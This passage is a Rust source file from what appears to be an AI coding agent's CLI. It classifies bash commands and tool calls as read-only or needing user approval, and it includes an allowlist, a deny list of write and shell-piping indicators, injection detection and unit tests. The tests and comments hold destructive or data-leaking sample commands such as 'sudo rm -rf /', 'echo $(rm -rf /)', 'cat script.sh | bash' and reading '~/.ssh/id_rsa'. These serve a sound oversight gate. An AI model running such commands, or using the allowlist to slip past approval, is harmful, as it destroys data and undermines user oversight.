//! Which edge tool names require an `approval_required` round-trip before `tool_request`
//! in cloud-orchestrated delivery ([`super::cloud_tool_delivery`]).
//!
//! CLI permission prompts use [`cloud_gated_tool_kind`] so icons (Execute vs Write) and cloud gating
//! cannot drift.

/// Canonical tool names requiring user approval, derived from the central
/// [`crate::tool_categories`] registry.
pub static CLOUD_APPROVAL_REQUIRED_TOOLS: std::sync::LazyLock<Vec<&'static str>> =
    std::sync::LazyLock::new(|| {
        let mut v = crate::tool::categories::registry().approval_required_names();
        v.sort();
        v
    });

/// Subset of approval-required tools that take a shell `command` argument.
pub static CLOUD_APPROVAL_EXECUTE_TOOLS: std::sync::LazyLock<Vec<&'static str>> =
    std::sync::LazyLock::new(|| {
        let mut v = crate::tool::categories::registry().execute_command_names();
        v.sort();
        v
    });

/// Whether a tool name requires cloud approval.
pub fn is_cloud_approval_required(name: &str) -> bool {
    crate::tool::categories::registry().is_approval_required(name)
}

/// Whether a tool name is a shell/execute command.
pub fn is_cloud_execute_tool(name: &str) -> bool {
    crate::tool::categories::registry().is_execute_command(name)
}

/// Read-only shell commands that can run concurrently without user approval.
/// These commands only read data and don't modify system state.
const READ_ONLY_COMMANDS: &[&str] = &[
    // File viewing
    "cat",
    "head",
    "tail",
    "wc",
    "stat",
    "sed -n",
    "ls",
    "ll",
    "tree",
    "file",
    // Git read-only
    "git status",
    "git log",
    "git diff",
    "git show",
    "git branch",
    "git ls-files",
    "git rev-parse",
    "git describe",
    "git remote",
    "git config --get",
    "git config --list",
    "git tag",
    "git stash list",
    // Search tools
    "grep",
    "find",
    "fd",
    "rg",
    "ag",
    "ack",
    "locate",
    // System info
    "pwd",
    "which",
    "type",
    "uname",
    "id",
    "df",
    "du",
    "free",
    "uptime",
    "whoami",
    "hostname",
    "env",
    "printenv",
    "date",
    "cal",
    "nproc",
    // Text processing (no output redirection)
    "cut",
    "paste",
    "tr",
    "sort",
    "uniq",
    "nl",
    "column",
    "fmt",
    "fold",
    "expand",
    // Path tools
    "basename",
    "dirname",
    "realpath",
    "readlink",
    // Misc safe
    "echo",
    "printf",
    "true",
    "false",
    "test",
    "expr",
    "seq",
    "sleep",
    "cd",
    // Rust/Cargo read-only
    "cargo check",
    "cargo clippy",
    "cargo fmt --check",
    "cargo test --no-run",
    "rustfmt --check",
    // Node/npm read-only
    "npm list",
    "npm ls",
    "npm outdated",
    "npm audit",
    "node --version",
    "npm --version",
    // Python read-only
    "python --version",
    "python3 --version",
    "pip list",
    "pip3 list",
    "pip freeze",
    "pip3 freeze",
];

/// Patterns that indicate a command has side effects (not read-only).
const WRITE_INDICATORS: &[&str] = &[
    // Output redirection
    ">",
    ">>",
    // Pipe to potentially dangerous commands
    "| tee ",
    "| xargs ",
    "| sh",
    "| bash",
    "| sudo",
    // Git write operations
    "git add",
    "git commit",
    "git push",
    "git pull",
    "git merge",
    "git rebase",
    "git reset",
    "git checkout",
    "git stash pop",
    "git stash apply",
    "git stash drop",
    "git stash clear",
    "git clean",
    "git rm",
    "git mv",
    // File operations
    "rm ",
    "mv ",
    "cp ",
    "mkdir ",
    "rmdir ",
    "touch ",
    "chmod ",
    "chown ",
    "ln ",
    "sed -i",
    "perl -pi",
    // Package managers (install/modify)
    "npm install",
    "npm i ",
    "npm uninstall",
    "npm update",
    "pip install",
    "pip3 install",
    "pip uninstall",
    "cargo install",
    "cargo build",
    "cargo run",
    "cargo clean",
    "apt install",
    "apt-get install",
    "brew install",
    // Dangerous
    "sudo ",
    "su ",
    "eval ",
    "exec ",
];

/// Strip benign fd forwarding (`2>&1`, `1>&2`, `&>/dev/null`, `>/dev/null`,
/// …) so downstream redirect scans don't flag pure stderr/stdout plumbing as
/// a workspace mutation.
///
/// This is the **single source of truth** for benign-redirect normalization.
/// `astra_runtime::bash_intent::segment_is_mutating` re-exports this via the
/// public API so the permission gate (read-only check) and the cache gate
/// (mutation check) cannot drift. Do not fork a local copy — extend here.
pub fn strip_benign_fd_redirects(command: &str) -> String {
    // Order matters: longer/more-specific patterns first so they win before a
    // shorter prefix consumes them (e.g. `&>>` before `&>`).
    let stripped = command
        .replace("2>&1", " ")
        .replace("1>&2", " ")
        .replace("&>/dev/null", " ")
        .replace("2>/dev/null", " ")
        .replace("1>/dev/null", " ")
        .replace(">/dev/null", " ");

    // Combined bash redirects `&>` / `&>>` are handled by the same scanner
    // as numeric fd redirects, so the *dangling* forms (`cmd &>` with no
    // target) fall back to conservative mutation classification instead of
    // being silently erased by a blind string `.replace`. Pinned by
    // `malformed_trailing_redirect_stays_conservative`.
    //
    // Generic `N> file` / `N>> file` (N in 0..=9) stripped to its target so
    // filenames containing write-verb substrings (e.g. `git_commit_trace.log`)
    // don't false-positive. We erase the operator + following whitespace +
    // non-whitespace filename token in one pass.
    strip_fd_redirect_to_file(&stripped)
}

/// Strip `N> file` and `N>> file` (N ∈ 0..=9) including the following filename
/// token. Pure string scan — no regex dependency in this hot path.
fn strip_fd_redirect_to_file(input: &str) -> String {
    let bytes = input.as_bytes();
    let mut out = String::with_capacity(input.len());
    let mut i = 0;
    while i < bytes.len() {
        let b = bytes[i];
        let left_ok = i == 0
            || matches!(
                bytes[i - 1],
                b' ' | b'\t' | b'\n' | b'|' | b';' | b'&' | b'('
            );
        let is_redirect = left_ok
            && i + 1 < bytes.len()
            && bytes[i + 1] == b'>'
            && (b.is_ascii_digit() || b == b'&');
        let op_len: Option<usize> = if is_redirect {
            if i + 2 < bytes.len() && bytes[i + 2] == b'>' {
                Some(3)
            } else {
                Some(2)
            }
        } else {
            None
        };

        if let Some(oplen) = op_len {
            let mut j = i + oplen;
            while j < bytes.len() && (bytes[j] == b' ' || bytes[j] == b'\t') {
                j += 1;
            }
            let had_token =
                j < bytes.len() && !matches!(bytes[j], b' ' | b'\t' | b'\n' | b'|' | b';' | b'&');
            while j < bytes.len() && !matches!(bytes[j], b' ' | b'\t' | b'\n' | b'|' | b';' | b'&')
            {
                j += 1;
            }
            if had_token {
                out.push(' ');
                i = j;
                continue;
            }
        }
        let ch = input[i..]
            .chars()
            .next()
            .expect("i < bytes.len() guarantees a scalar");
        let ch_len = ch.len_utf8();
        out.push_str(&input[i..i + ch_len]);
        i += ch_len;
    }
    out
}

/// Shell metacharacters that can embed arbitrary commands or leak data.
/// Checked before the read-only prefix match because `echo \`rm -rf /\``
/// or `cat $HOME/.ssh/id_rsa` would otherwise pass as "read-only echo/cat".
fn has_shell_injection_patterns(command: &str) -> bool {
    // Backtick command substitution: `cmd`
    if command.contains('`') {
        return true;
    }
    // $(...) command substitution or ${...} brace expansion or $VAR
    if command.contains("$(") || command.contains("${") {
        return true;
    }
    // Bare $VAR references (but not standalone $ at end of string).
    let bytes = command.as_bytes();
    for i in 0..bytes.len().saturating_sub(1) {
        if bytes[i] == b'$' {
            let next = bytes[i + 1];
            if next.is_ascii_alphabetic() || next == b'_' {
                return true;
            }
        }
    }
    // Process substitution: <(...) or >(...)
    if command.contains("<(") || command.contains(">(") {
        return true;
    }
    // Background operator: trailing & (but not &&)
    let trimmed = command.trim_end();
    if trimmed.ends_with('&') && !trimmed.ends_with("&&") {
        return true;
    }
    false
}

fn first_write_indicator(command: &str) -> Option<&'static str> {
    WRITE_INDICATORS
        .iter()
        .copied()
        .find(|indicator| command.contains(indicator))
}

fn matches_read_only_prefix(command: &str) -> bool {
    for ro_cmd in READ_ONLY_COMMANDS {
        if let Some(rest) = command.strip_prefix(ro_cmd) {
            // Ensure it's a word boundary (not a prefix of a longer command)
            if rest.is_empty() || rest.starts_with(' ') || rest.starts_with('\n') {
                return true;
            }
        }
    }
    false
}

fn has_shell_injection_vector(command: &str) -> bool {
    has_shell_injection_patterns(command) || command.contains(';')
}

/// Why a bash command was classified as **requiring approval** (not read-only).
///
/// Returned by [`bash_command_approval_reason`]. Surfaced in CLI approval
/// prompts so users can understand *why* a command tripped the classifier.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum BashApprovalReason {
    /// Command string was empty after trimming.
    Empty,
    /// Contains shell injection vectors.
    ShellInjection,
    /// Contains a write indicator (`>`, `rm`, `sed -i`, etc.).
    WriteIndicator(String),
    /// Command prefix is not in the read-only allowlist.
    UnknownPrefix(String),
}

impl BashApprovalReason {
    /// Short, human-readable rationale suitable for an approval prompt line.
    pub fn display(&self) -> String {
        match self {
            BashApprovalReason::Empty => "empty command".to_string(),
            BashApprovalReason::ShellInjection => {
                "shell injection vector (`$(…)`, backtick, or `;`)".to_string()
            }
            BashApprovalReason::WriteIndicator(ind) => {
                let action = humanize_write_indicator(ind.as_str());
                format!("{action} (`{trimmed}`)", trimmed = ind.trim())
            }
            BashApprovalReason::UnknownPrefix(tok) => {
                format!("`{tok}` may modify your system (unrecognized command)")
            }
        }
    }
}

fn humanize_write_indicator(indicator: &str) -> &'static str {
    let trimmed = indicator.trim();
    const TABLE: &[(&str, &str)] = &[
        (">>", "appends to a file"),
        (">", "writes to a file"),
        ("rm", "deletes files"),
        ("mv", "moves or renames files"),
        ("cp", "copies files"),
        ("mkdir", "creates directories"),
        ("rmdir", "removes directories"),
        ("touch", "creates or updates files"),
        ("chmod", "changes file permissions"),
        ("chown", "changes file ownership"),
        ("ln", "creates a link"),
        ("sed -i", "edits files in place"),
        ("perl -pi", "edits files in place"),
        ("git add", "stages changes in git"),
        ("git commit", "creates a git commit"),
        ("git push", "pushes to a remote"),
        ("git pull", "pulls from a remote"),
        ("git merge", "merges branches"),
        ("git rebase", "rebases a branch"),
        ("git reset", "resets git state"),
        ("git checkout", "switches branches or restores files"),
        ("git stash pop", "applies and drops a stash"),
        ("git stash apply", "applies a stash"),
        ("git stash drop", "drops a stash"),
        ("git stash clear", "clears all stashes"),
        ("git clean", "deletes untracked files"),
        ("git rm", "removes files from git"),
        ("git mv", "moves files in git"),
        ("npm install", "installs packages"),
        ("npm i", "installs packages"),
        ("npm uninstall", "uninstalls packages"),
        ("npm update", "updates packages"),
        ("pip install", "installs packages"),
        ("pip3 install", "installs packages"),
        ("pip uninstall", "uninstalls packages"),
        ("cargo install", "installs a cargo binary"),
        ("cargo build", "builds the cargo project"),
        ("| tee", "writes via `tee`"),
        ("| xargs", "pipes to `xargs` (may execute commands)"),
        ("| sh", "pipes into a shell"),
        ("| bash", "pipes into a shell"),
        ("| sudo", "pipes into `sudo`"),
    ];
    for (prefix, phrase) in TABLE {
        if trimmed.starts_with(prefix) {
            return phrase;
        }
    }
    "may modify your system"
}

/// Check if a bash command is read-only (safe for concurrent execution).
///
/// Returns `true` if the command appears to only read data without side effects.
/// Used to allow read-only bash commands to run concurrently without user approval.
///
/// Thin wrapper over [`bash_command_approval_reason`]: returns `true` iff the
/// classifier reports no reason to require approval. See that function for the
/// full algorithm.
pub fn bash_command_is_read_only(command: &str) -> bool {
    bash_command_approval_reason(command).is_none()
}

/// Classify a bash command and return the rationale if approval is required.
///
/// Returns `None` when the command is read-only (no approval needed). Returns
/// `Some(reason)` explaining why the command tripped the classifier — used by
/// CLI approval prompts to show users *why* a command needs their confirmation.
///
/// # Algorithm
/// 1. Normalize harmless fd forwarding (`2>&1`, `1>&2`, `/dev/null`, …)
/// 2. Reject shell expansion/sequencing forms that can hide arbitrary commands
/// 3. Split read-only compounds/pipelines (`cargo check | head -50`) into segments
/// 4. For each segment: reject on write indicators, then require read-only prefix
/// 5. Default to [`BashApprovalReason::UnknownPrefix`] for unknown commands
pub fn bash_command_approval_reason(command: &str) -> Option<BashApprovalReason> {
    let cmd = command.trim();

    if cmd.is_empty() {
        return Some(BashApprovalReason::Empty);
    }

    let normalized = strip_benign_fd_redirects(cmd);
    let normalized = normalized.trim();
    if normalized.is_empty() {
        return Some(BashApprovalReason::Empty);
    }
    if has_shell_injection_vector(normalized) {
        return Some(BashApprovalReason::ShellInjection);
    }

    let parsed = crate::permission::compound_command::tokenize_compound_command(normalized);
    if parsed.steps.is_empty() {
        return Some(BashApprovalReason::Empty);
    }
    for step in parsed.steps {
        if let Some(reason) = bash_segment_approval_reason(step.command.as_str()) {
            return Some(reason);
        }
    }
    None
}

/// Segment-level classifier with rationale. Returns `None` if the segment is
/// a valid read-only command.
fn bash_segment_approval_reason(command: &str) -> Option<BashApprovalReason> {
    let cmd = command.trim();
    if cmd.is_empty() {
        return Some(BashApprovalReason::Empty);
    }
    if let Some(indicator) = first_write_indicator(cmd) {
        return Some(BashApprovalReason::WriteIndicator(indicator.to_string()));
    }
    if !matches_read_only_prefix(cmd) {
        let first_token = cmd.split_whitespace().next().unwrap_or(cmd).to_string();
        return Some(BashApprovalReason::UnknownPrefix(first_token));
    }
    None
}

/// Kind of side effect for tools gated before edge execution.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CloudGatedToolKind {
    Write,
    Execute,
}

/// Returns [`None`] when the tool is not cloud-gated (treated as read-only for approval purposes).
/// Name-only variant: does not inspect arguments.
#[inline]
pub fn cloud_gated_tool_kind(name: &str) -> Option<CloudGatedToolKind> {
    cloud_gated_tool_kind_with_args(name, None)
}

/// Args-aware variant: for shell tools, inspects the `command` argument.
///
/// `bash "git status"` → `None` (read-only, no approval needed).
/// `bash "rm -rf /"` → `Some(Execute)` (mutating, approval required).
/// `bash` (no args) → `Some(Execute)` (fail-closed).
#[inline]
pub fn cloud_gated_tool_kind_with_args(
    name: &str,
    args: Option<&serde_json::Value>,
) -> Option<CloudGatedToolKind> {
    if name.starts_with("mcp_") {
        return Some(CloudGatedToolKind::Execute);
    }
    let classification = crate::tool::categories::classify(name, args);
    if !classification.approval_required {
        return None;
    }
    if classification.category.is_shell() {
        Some(CloudGatedToolKind::Execute)
    } else {
        Some(CloudGatedToolKind::Write)
    }
}

/// Returns true if `name` is in [`CLOUD_APPROVAL_REQUIRED_TOOLS`].
#[inline]
pub fn edge_tool_requires_cloud_approval(name: &str) -> bool {
    cloud_gated_tool_kind(name).is_some()
}

/// Args-aware variant: `bash "git status"` returns false (no approval).
#[inline]
pub fn edge_tool_requires_cloud_approval_with_args(
    name: &str,
    args: Option<&serde_json::Value>,
) -> bool {
    cloud_gated_tool_kind_with_args(name, args).is_some()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn each_listed_tool_requires_approval() {
        for &name in CLOUD_APPROVAL_REQUIRED_TOOLS.iter() {
            assert!(
                edge_tool_requires_cloud_approval(name),
                "list entry must satisfy predicate: {name}"
            );
        }
    }

    #[test]
    fn read_only_tools_skip_approval_gate() {
        for name in ["read_file", "list_dir", "grep", "glob", "git_status"] {
            assert!(
                !edge_tool_requires_cloud_approval(name),
                "{name} should not require cloud approval"
            );
        }
    }

    #[test]
    fn unknown_tool_not_gated() {
        assert!(!edge_tool_requires_cloud_approval("made_up_tool"));
        assert!(!edge_tool_requires_cloud_approval(""));
    }

    #[test]
    fn list_is_sorted_for_stable_diffs() {
        let mut sorted = CLOUD_APPROVAL_REQUIRED_TOOLS.clone();
        sorted.sort_unstable();
        assert_eq!(
            *CLOUD_APPROVAL_REQUIRED_TOOLS, sorted,
            "CLOUD_APPROVAL_REQUIRED_TOOLS should stay sorted"
        );
    }

    #[test]
    fn execute_tools_sorted_and_subset_of_required() {
        let mut sorted = CLOUD_APPROVAL_EXECUTE_TOOLS.clone();
        sorted.sort_unstable();
        assert_eq!(
            *CLOUD_APPROVAL_EXECUTE_TOOLS, sorted,
            "CLOUD_APPROVAL_EXECUTE_TOOLS should stay sorted"
        );
        for &name in CLOUD_APPROVAL_EXECUTE_TOOLS.iter() {
            assert!(
                CLOUD_APPROVAL_REQUIRED_TOOLS.contains(&name),
                "{name} must appear in CLOUD_APPROVAL_REQUIRED_TOOLS"
            );
        }
    }

    #[test]
    fn required_tools_partition_into_execute_and_write() {
        for &name in CLOUD_APPROVAL_REQUIRED_TOOLS.iter() {
            let kind = cloud_gated_tool_kind(name).expect("required tools must classify");
            match kind {
                CloudGatedToolKind::Execute => {
                    assert!(CLOUD_APPROVAL_EXECUTE_TOOLS.contains(&name));
                }
                CloudGatedToolKind::Write => {
                    assert!(!CLOUD_APPROVAL_EXECUTE_TOOLS.contains(&name));
                }
            }
        }
    }

    #[test]
    fn individual_tool_kind_classification() {
        // Write-gated tools
        for tool in &[
            "git_stash",
            "git_commit",
            "git_revert_commit",
            "delete_file",
            "github_create_issue",
        ] {
            assert_eq!(
                cloud_gated_tool_kind(tool),
                Some(CloudGatedToolKind::Write),
                "{tool} must be write-gated"
            );
        }
        // Background task controls are not cloud-gated
        for tool in &["task_output", "task_list", "task_stop"] {
            assert_eq!(
                cloud_gated_tool_kind(tool),
                None,
                "{tool} must not be cloud-gated"
            );
        }
    }

    // ── bash_command_is_read_only tests ──

    #[test]
    fn bash_read_only_commands() {
        // Simple read-only commands
        assert!(bash_command_is_read_only("ls"));
        assert!(bash_command_is_read_only("ls -la"));
        assert!(bash_command_is_read_only("cat file.txt"));
        assert!(bash_command_is_read_only("head -n 10 file.txt"));
        assert!(bash_command_is_read_only("tail -f log.txt"));
        assert!(bash_command_is_read_only("sed -n '565,572p' file.rs"));
        assert!(bash_command_is_read_only("wc -l file.txt"));
        assert!(bash_command_is_read_only("pwd"));
        assert!(bash_command_is_read_only("whoami"));
        assert!(bash_command_is_read_only("date"));

        // Git read-only
        assert!(bash_command_is_read_only("git status"));
        assert!(bash_command_is_read_only("git log --oneline"));
        assert!(bash_command_is_read_only("git diff HEAD"));
        assert!(bash_command_is_read_only("git show abc123"));
        assert!(bash_command_is_read_only("git branch -a"));
        assert!(bash_command_is_read_only("git ls-files"));

        // Search tools
        assert!(bash_command_is_read_only("grep -r pattern ."));
        assert!(bash_command_is_read_only("find . -name '*.rs'"));
        assert!(bash_command_is_read_only("rg pattern"));

        // Cargo/npm read-only
        assert!(bash_command_is_read_only("cargo check"));
        assert!(bash_command_is_read_only("cargo clippy"));
        assert!(bash_command_is_read_only("npm list"));
        assert!(bash_command_is_read_only("cargo check 2>&1 | head -50"));
        assert!(bash_command_is_read_only(
            "cd rust && cargo test --no-run 2>&1 | tail -20"
        ));
        assert!(bash_command_is_read_only(
            r#"cd /home/xupeng/github/astra && grep -n "fn powershell\|fn bash_with_cancel\|execute_with_metadata_responsive" rust/crates/astra-cli/src/edge_tools/shell.rs rust/crates/astra-cli/src/cli/stream_render.rs"#
        ));
        assert!(bash_command_is_read_only(
            r#"cd rust && grep -n "is_unsafe_bare_shell_prefix\|UNSAFE_SHELL\|is_dangerous_bash_allow_shape" crates/astra-cli/src/edge_tools/shell.rs | head -n 20"#
        ));

        // cd-prefixed commands
        assert!(bash_command_is_read_only("cd project && ls"));
        assert!(bash_command_is_read_only("cd /tmp && cat file.txt"));
        assert!(bash_command_is_read_only(
            "cd /repo && sed -n '1,20p' a.rs && echo '---' && sed -n '30,40p' b.rs"
        ));
        assert!(bash_command_is_read_only("cd /tmp"));
    }

    #[test]
    fn bash_write_commands_not_read_only() {
        // File operations
        assert!(!bash_command_is_read_only("rm file.txt"));
        assert!(!bash_command_is_read_only("mv a.txt b.txt"));
        assert!(!bash_command_is_read_only("cp a.txt b.txt"));
        assert!(!bash_command_is_read_only("mkdir dir"));
        assert!(!bash_command_is_read_only("touch file.txt"));
        assert!(!bash_command_is_read_only("sed -i 's/a/b/' file.rs"));
        assert!(!bash_command_is_read_only("cd $(malicious)"));
        assert!(!bash_command_is_read_only("ls `malicious`"));
        assert!(!bash_command_is_read_only("ls ; ls"));

        // Git write operations
        assert!(!bash_command_is_read_only("git add ."));
        assert!(!bash_command_is_read_only("git commit -m 'msg'"));
        assert!(!bash_command_is_read_only("git push origin main"));
        assert!(!bash_command_is_read_only("git checkout main"));
        assert!(!bash_command_is_read_only("git reset --hard"));

        // Output redirection
        assert!(!bash_command_is_read_only("ls > output.txt"));
        assert!(!bash_command_is_read_only("echo hello >> file.txt"));

        // Package installation
        assert!(!bash_command_is_read_only("npm install package"));
        assert!(!bash_command_is_read_only("pip install package"));
        assert!(!bash_command_is_read_only("cargo build"));

        // Dangerous commands
        assert!(!bash_command_is_read_only("sudo rm -rf /"));
        assert!(!bash_command_is_read_only("eval 'echo bad'"));
    }

    #[test]
    fn bash_pipe_to_dangerous_commands() {
        assert!(!bash_command_is_read_only("ls | tee output.txt"));
        assert!(!bash_command_is_read_only("echo test | xargs rm"));
        assert!(!bash_command_is_read_only("cat script.sh | bash"));
        assert!(!bash_command_is_read_only(
            "cargo check 2>&1 | tee build.log"
        ));
        // Regression for the compound-parsing unification: an unsafe step on
        // the RHS of a pipe must still mark the chain as approval-required.
        assert!(!bash_command_is_read_only("ls | rm -rf /"));
        assert!(!bash_command_is_read_only("git status | sh"));
    }

    #[test]
    fn bash_empty_command() {
        assert!(!bash_command_is_read_only(""));
        assert!(!bash_command_is_read_only("   "));
    }

    #[test]
    fn bash_unknown_commands_not_read_only() {
        // Unknown commands should require approval (conservative)
        assert!(!bash_command_is_read_only("custom_script.sh"));
        assert!(!bash_command_is_read_only("./run.sh"));
        assert!(!bash_command_is_read_only("make"));
        assert!(!bash_command_is_read_only("docker run image"));
    }

    // ── MCP permission gating tests ──

    #[test]
    fn mcp_tools_require_approval() {
        assert!(edge_tool_requires_cloud_approval("mcp_filesystem_read"));
        assert!(edge_tool_requires_cloud_approval("mcp_github_search"));
        assert!(edge_tool_requires_cloud_approval(
            "mcp_custom_server_do_stuff"
        ));
    }

    #[test]
    fn mcp_tools_classified_as_execute() {
        assert_eq!(
            cloud_gated_tool_kind("mcp_anything"),
            Some(CloudGatedToolKind::Execute),
        );
        assert_eq!(
            cloud_gated_tool_kind("mcp_server_tool"),
            Some(CloudGatedToolKind::Execute),
        );
    }

    #[test]
    fn non_mcp_unknown_tool_not_gated() {
        assert!(!edge_tool_requires_cloud_approval("mcp"));
        assert!(!edge_tool_requires_cloud_approval("my_mcp_tool"));
    }

    /// Regression: every benign fd redirect pattern in
    /// `strip_benign_fd_redirects` must keep the command read-only. Twin of
    /// keep the two corpora aligned.
    #[test]
    fn benign_fd_redirect_handling() {
        // ── Basic fd redirects are read-only ──
        for cmd in &[
            "cargo check 2>&1",
            "cargo check 1>&2",
            "cargo check 2>/dev/null",
            "cargo check 1>/dev/null",
            "cargo check >/dev/null",
            "cargo check &>/dev/null",
            "cargo check &>> /tmp/unused_log",
            "cargo check 2>&1 | head -50",
        ] {
            assert!(
                bash_command_is_read_only(cmd),
                "expected read-only: {cmd:?}"
            );
        }

        // ── Filenames containing write-indicator substrings don't false-positive ──
        for cmd in &[
            "cargo check &>> /tmp/rm_me.log",
            "cargo check &>> /var/log/mv_state",
            "cargo check &>> ./cp_backup.log",
            "cargo check &> /tmp/chmod.out",
            "cargo check 2> /tmp/git_commit_trace.log",
            "cargo check &>> /tmp/rm_me.log && echo done",
            "cargo check &>> /tmp/日志.log",
        ] {
            assert!(
                bash_command_is_read_only(cmd),
                "expected read-only: {cmd:?}"
            );
        }
        // Malformed dangling redirect must trigger mutation scan (fail-closed)
        assert!(!bash_command_is_read_only("cargo check 2>"));

        // ── Left token boundary requirement ──
        assert!(!bash_command_is_read_only("echo a2>/tmp/x"));
        assert!(!bash_command_is_read_only("echo a2>>/tmp/x"));
        for cmd in &[
            "cargo check 2>/tmp/log",
            "2>/tmp/log cargo check",
            "true | 2>/tmp/log cargo check",
        ] {
            assert!(
                bash_command_is_read_only(cmd),
                "expected read-only: {cmd:?}"
            );
        }
    }

    // ── bash_command_approval_reason tests (TDD for rationale surfacing) ──

    #[test]
    fn approval_reason_basics() {
        // Read-only commands return None
        for cmd in &["ls -la", "cargo check 2>&1 | head", "git status"] {
            assert_eq!(
                bash_command_approval_reason(cmd),
                None,
                "{cmd:?} should have no approval reason"
            );
        }
        // Empty / whitespace-only → Empty
        for cmd in &["", "   "] {
            assert_eq!(
                bash_command_approval_reason(cmd),
                Some(BashApprovalReason::Empty)
            );
        }
        // Shell injection vectors
        for cmd in &["echo $(rm -rf /)", "echo `rm -rf /`", "ls; rm foo"] {
            assert_eq!(
                bash_command_approval_reason(cmd),
                Some(BashApprovalReason::ShellInjection),
                "{cmd:?} must surface ShellInjection"
            );
        }
        // display() is non-empty for all variants
        for v in [
            BashApprovalReason::Empty,
            BashApprovalReason::ShellInjection,
            BashApprovalReason::WriteIndicator(">".to_string()),
            BashApprovalReason::UnknownPrefix("foobar".to_string()),
        ] {
            assert!(
                !v.display().is_empty(),
                "display() must be non-empty for {v:?}"
            );
        }
    }

    /// Write indicators must surface the matched token and its humanized display.
    /// Unknown-prefix commands must name the first token with risk-framed display.
    #[test]
    fn approval_reason_ux_contracts() {
        // ── WriteIndicator: names the matched token ──
        let reason = bash_command_approval_reason("rm -rf /tmp/foo");
        match &reason {
            Some(BashApprovalReason::WriteIndicator(ind)) => {
                assert!(
                    !ind.is_empty(),
                    "write indicator must carry the matched token"
                );
                assert!(
                    ind.trim() == "rm" || ind.starts_with("rm"),
                    "expected `rm` indicator, got {ind:?}"
                );
            }
            other => panic!("expected WriteIndicator, got {other:?}"),
        }
        let display = reason.unwrap().display();
        assert!(
            display.contains("rm"),
            "display must cite raw token: {display}"
        );
        assert!(
            !display.contains("write indicator"),
            "display must not leak jargon: {display}"
        );

        // ── WriteIndicator display: humanized per-indicator phrases ──
        let indicator_cases = [
            (">", "writes to a file"),
            (">>", "appends to a file"),
            ("rm ", "deletes files"),
            ("mv ", "moves or renames files"),
            ("sed -i", "edits files in place"),
            ("chmod ", "changes file permissions"),
            ("npm install", "installs packages"),
        ];
        for (ind, expected_phrase) in indicator_cases {
            let d = BashApprovalReason::WriteIndicator(ind.to_string()).display();
            assert!(
                d.contains(expected_phrase),
                "WriteIndicator({ind:?}) missing {expected_phrase:?}: {d:?}"
            );
            assert!(
                d.contains(ind.trim()),
                "WriteIndicator display must cite raw token `{ind}`: {d:?}"
            );
        }

        // ── UnknownPrefix: names the first token ──
        assert_eq!(
            bash_command_approval_reason("foobar --flag"),
            Some(BashApprovalReason::UnknownPrefix("foobar".to_string()))
        );
        match bash_command_approval_reason("cat file | foobar") {
            Some(BashApprovalReason::UnknownPrefix(tok)) => assert_eq!(tok, "foobar"),
            other => panic!("expected UnknownPrefix(foobar), got {other:?}"),
        }

        // ── UnknownPrefix display: risk-framed, not allowlist jargon ──
        let ux_display = BashApprovalReason::UnknownPrefix("foobar".to_string()).display();
        assert!(
            ux_display.contains("foobar"),
            "display must cite unknown token: {ux_display}"
        );
        let lower = ux_display.to_lowercase();
        assert!(
            lower.contains("modify") || lower.contains("unrecognized") || lower.contains("unknown"),
            "display should frame as risk/unknown, not allowlist: {ux_display}"
        );
        assert!(
            !ux_display.contains("allowlist"),
            "display must not leak allowlist jargon: {ux_display}"
        );
    }

    /// The `display()` method must produce non-empty, human-readable text
    /// for every variant (the CLI appends this directly to the approval
    /// banner; a blank string would be a silent UX regression).
    #[test]
    fn approval_reason_display_is_non_empty_for_all_variants() {
        let variants = [
            BashApprovalReason::Empty,
            BashApprovalReason::ShellInjection,
            BashApprovalReason::WriteIndicator(">".to_string()),
            BashApprovalReason::UnknownPrefix("foobar".to_string()),
        ];
        for v in variants {
            let s = v.display();
            assert!(!s.is_empty(), "display() must be non-empty for {v:?}");
        }
    }

    /// Residual-risk guard: malformed trailing redirect (`cmd 2>` / `cmd >`
    /// with no target) MUST fall back to conservative mutation classification
    /// — shell itself errors on dangling redirects, so we prefer false-
    /// positive approval over silent miss. Twin of
    /// `astra_runtime::bash_intent::malformed_trailing_redirect_stays_conservative`;
    /// if you change this, change both sides.
    #[test]
    fn malformed_trailing_redirect_stays_conservative() {
        assert!(!bash_command_is_read_only("cargo check 2>"));
        assert!(!bash_command_is_read_only("cargo check >"));
        assert!(!bash_command_is_read_only("cargo check 2>>"));
        // Bash combined redirect variants must also fall back to mutating
        // when dangling. Previously `.replace("&>", " ")` silently ate the
        // operator and made `cargo check &>` look read-only.
        assert!(!bash_command_is_read_only("cargo check &>"));
        assert!(!bash_command_is_read_only("cargo check &>>"));
    }
    // ── Args-aware cloud approval tests ──

    #[test]
    fn bash_args_aware_approval() {
        // (command, requires_approval, expected_kind)
        let cases: &[(&str, bool, Option<CloudGatedToolKind>)] = &[
            ("git status", false, None),
            ("ls -la", false, None),
            ("cargo check 2>&1 | head -50", false, None),
            ("rm -rf /", true, Some(CloudGatedToolKind::Execute)),
            ("git push origin main", true, None), // None = don't check kind
            ("", true, None),
        ];
        for (cmd, requires, expected_kind) in cases {
            let args = serde_json::json!({"command": cmd});
            let result = edge_tool_requires_cloud_approval_with_args("bash", Some(&args));
            assert_eq!(
                result, *requires,
                "bash {cmd:?}: requires_approval mismatch"
            );
            if let Some(kind) = expected_kind {
                assert_eq!(
                    cloud_gated_tool_kind_with_args("bash", Some(&args)),
                    Some(*kind),
                    "bash {cmd:?}: kind mismatch"
                );
            }
        }
        // No args → requires approval with Execute kind
        assert!(edge_tool_requires_cloud_approval_with_args("bash", None));
        assert_eq!(
            cloud_gated_tool_kind_with_args("bash", None),
            Some(CloudGatedToolKind::Execute)
        );
    }

    #[test]
    fn args_aware_non_bash_tools() {
        let file_args = serde_json::json!({"file_path": "/foo/bar"});
        // Read-only tools skip approval even with args
        assert!(!edge_tool_requires_cloud_approval_with_args(
            "read_file",
            Some(&file_args)
        ));
        assert!(!edge_tool_requires_cloud_approval_with_args(
            "grep",
            Some(&file_args)
        ));
        // write_file still requires approval
        let write_args = serde_json::json!({"file_path": "/foo/bar", "content": "hello"});
        assert!(edge_tool_requires_cloud_approval_with_args(
            "write_file",
            Some(&write_args)
        ));
        assert_eq!(
            cloud_gated_tool_kind_with_args("write_file", Some(&write_args)),
            Some(CloudGatedToolKind::Write)
        );
        // MCP tools always require approval
        let mcp_args = serde_json::json!({"command": "ls"});
        assert!(edge_tool_requires_cloud_approval_with_args(
            "mcp_tool",
            Some(&mcp_args)
        ));
        assert_eq!(
